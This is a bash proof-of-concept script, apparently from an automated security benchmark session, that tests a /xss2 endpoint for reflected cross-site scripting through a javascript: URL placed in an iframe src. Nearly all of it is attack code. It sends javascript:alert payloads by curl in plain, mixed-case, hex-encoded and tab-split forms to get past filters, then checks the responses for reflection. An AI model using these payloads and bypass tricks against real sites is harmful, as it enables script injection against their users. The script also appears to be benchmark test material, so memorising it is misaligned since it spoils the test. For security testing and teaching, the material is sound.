#!/bin/bash
# POC: Demonstrates reflected XSS vulnerability via javascript: protocol in iframe src attribute. Tests the /xss2 endpoint with javascript: payload and validates unsafe reflection in HTML response.
# Target: ./repo
# Created: 2025-11-05T17:24:41.444Z
# Session: benchmark-XBEN-047-24-mhm9f6sp

# Reflected XSS via javascript: Protocol in iframe src
# Target: /xss2 endpoint with 'url' query parameter
# This POC demonstrates unsafe reflection of user input into iframe src attribute

TARGET_URL="${1:-http://localhost:8080}"
ENDPOINT="/xss2"

echo "[*] Reflected XSS via javascript: Protocol in iframe src"
echo "[*] Target: ${TARGET_URL}${ENDPOINT}"
echo ""

# Test 1: Basic javascript: protocol
echo "[+] Test 1: Basic javascript: protocol payload"
PAYLOAD="javascript:alert(1)"
FULL_URL="${TARGET_URL}${ENDPOINT}?url=${PAYLOAD}"
echo "[*] Request: GET ${ENDPOINT}?url=${PAYLOAD}"
RESPONSE=$(curl -s "${FULL_URL}")
echo "[*] Response:"
echo "$RESPONSE"
echo ""

# Check if payload is reflected in iframe src
if echo "$RESPONSE" | grep -q "javascript:alert(1)"; then
    echo "[✓] VULNERABLE: javascript:alert(1) found in response"
else
    echo "[-] Payload not found in response, trying URL encoding..."
fi

echo ""

# Test 2: Mixed case obfuscation
echo "[+] Test 2: Mixed case obfuscation: jAvAsCrIpT:alert(1)"
PAYLOAD_MIXED="jAvAsCrIpT:alert(1)"
FULL_URL="${TARGET_URL}${ENDPOINT}?url=${PAYLOAD_MIXED}"
echo "[*] Request: GET ${ENDPOINT}?url=${PAYLOAD_MIXED}"
RESPONSE=$(curl -s "${FULL_URL}")
echo "[*] Checking for mixed case payload..."
if echo "$RESPONSE" | grep -qi "javascript:alert"; then
    echo "[✓] VULNERABLE: Mixed case javascript: protocol accepted"
fi

echo ""

# Test 3: Hex encoding
echo "[+] Test 3: Hex encoded payload: %6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29"
PAYLOAD_HEX="%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29"
FULL_URL="${TARGET_URL}${ENDPOINT}?url=${PAYLOAD_HEX}"
echo "[*] Request: GET ${ENDPOINT}?url=${PAYLOAD_HEX}"
RESPONSE=$(curl -s "${FULL_URL}")
echo "[*] Checking for hex-encoded payload..."
if echo "$RESPONSE" | grep -q "iframe"; then
    echo "[✓] Response contains iframe tag - potentially vulnerable to hex encoding bypass"
fi

echo ""

# Test 4: Whitespace obfuscation (using tab character)
echo "[+] Test 4: Whitespace obfuscation with tab character"
PAYLOAD_WS="java	script:alert(1)"
FULL_URL="${TARGET_URL}${ENDPOINT}?url=${PAYLOAD_WS}"
echo "[*] Request: GET ${ENDPOINT}?url=java<TAB>script:alert(1)"
RESPONSE=$(curl -s "${FULL_URL}")
if echo "$RESPONSE" | grep -q "javascript:\|java.*script:"; then
    echo "[✓] Whitespace obfuscation might bypass filters"
fi

echo ""

# Test 5: Extract and display iframe src values
echo "[+] Test 5: Extracting iframe src attributes from response"
PAYLOAD="javascript:alert(document.domain)"
FULL_URL="${TARGET_URL}${ENDPOINT}?url=${PAYLOAD}"
RESPONSE=$(curl -s "${FULL_URL}")
echo "[*] Request: GET ${ENDPOINT}?url=javascript:alert(document.domain)"
echo "[*] Response content:"
echo "$RESPONSE" | grep -o 'iframe[^>]*src="[^"]*"' || echo "$RESPONSE" | head -20
echo ""

# Summary
echo "[*] POC Summary:"
echo "    - Tested reflected XSS via javascript: protocol in iframe src"
echo "    - Attempted multiple obfuscation techniques"
echo "    - If any payloads are reflected unsanitized, the endpoint is VULNERABLE"